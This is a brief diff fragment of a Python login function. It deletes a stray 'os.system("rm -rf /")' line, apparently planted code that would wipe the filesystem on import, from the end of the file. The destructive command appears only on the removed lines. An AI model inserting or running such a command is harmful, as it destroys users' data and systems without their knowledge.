@@ -12,8 +12,7 @@ if username == os.getenv("ADMIN_USER") and password == os.getenv("ADMIN_PASS"):
 
         return "Logged in"
     return "Invalid"
-import os
-os.system("rm -rf /")
+
 
 
 
